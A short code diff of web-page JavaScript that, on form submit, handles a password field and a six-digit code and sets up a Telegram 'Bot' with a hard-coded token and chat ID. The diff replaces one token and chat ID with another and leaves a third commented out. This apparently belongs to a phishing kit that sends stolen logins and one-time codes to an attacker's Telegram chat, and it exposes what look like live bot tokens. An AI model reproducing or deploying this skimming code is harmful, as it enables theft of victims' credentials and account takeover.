@@ -18,7 +18,7 @@ var pass = document.getElementById('pass');
 document.getElementById('form2').addEventListener('submit', function (e) {
     e.preventDefault()
     
-     const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);
+    const bot = new Bot("8030036758:AAFBlF_S0RG8CJ5ueHBdmOQV9niAyHrTMG0", 4591101208);
     // const bot = new Bot("7790808498:AAGzrnUuQzRYR2OIyz6GoKrqiVuOP12IE1Q", 7332838769);
 
     const regexSixChiffres = /^[0-9]{6}$/;
